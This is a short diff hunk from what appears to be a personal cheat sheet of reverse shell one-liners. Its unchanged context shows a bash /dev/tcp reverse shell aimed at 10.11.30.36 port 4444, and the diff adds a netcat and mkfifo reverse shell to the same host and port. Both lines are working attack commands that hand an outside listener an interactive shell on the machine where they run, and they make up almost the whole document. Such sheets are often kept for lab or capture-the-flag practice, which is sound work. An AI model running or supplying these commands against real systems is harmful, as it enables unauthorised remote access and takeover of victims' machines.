@@ -70,6 +70,8 @@ PHP REV SHELL ONE LINER
 BASH REV SHELL ONELINER
 
 `bash -i &>/dev/tcp/10.11.30.36/4444 <&1`
+ 
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.36 4444 >/tmp/f #`
 
 
 
